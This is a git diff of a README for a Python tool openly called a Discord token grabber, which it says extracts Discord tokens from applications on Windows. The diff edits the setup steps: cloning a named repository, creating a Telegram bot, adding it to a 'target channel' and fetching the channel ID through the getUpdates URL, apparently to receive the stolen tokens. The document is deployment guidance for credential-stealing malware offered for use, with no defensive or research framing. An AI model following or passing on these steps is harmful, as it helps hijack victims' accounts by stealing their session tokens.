@@ -28,7 +28,7 @@ This Python script extracts Discord tokens from various applications on a Window
 1. **Clone the Repository**:
 
 ```bash
-   git clone https://github.com/yourusername/discord-token-grabber.git
+   git clone https://github.com/csosfzonu/Discord_token_grabber.git
 ```
 
 2. **Install Dependencies**:
@@ -39,19 +39,19 @@ This Python script extracts Discord tokens from various applications on a Window
 
    3.1 Open BotFather on Telegram.
 
-   3.2 Use the /newbot command to create a new bot.
+   3.2 Use the `/newbot` command to create a new bot.
 
    3.3 Follow the instructions to set a name and username for your bot.
 
    3.4 Once the bot is created, you will receive a Bot Token. Save this token for later use.
 
-   3.5 Example Token: `12345:ABCDEF...`
+   3.5 Example Token: `12345`
    **Step 2: Get Your Channel ID**
    3.6 Add your bot to the target channel as an administrator.
 
    3.7 Swap `<YOUR_BOT_TOKEN>` with your bot token in this URL:  
-    For instance, if your token is `12345:ABCDEF...`, the URL becomes:  
-    `https://api.telegram.org/bot12345:ABCDEF.../getUpdates`
+    For instance, if your token is `12345`, the URL becomes:  
+    `https://api.telegram.org/bot12345/getUpdates`
 
    3.8 Open that URL in your browser (e.g., Chrome).
 
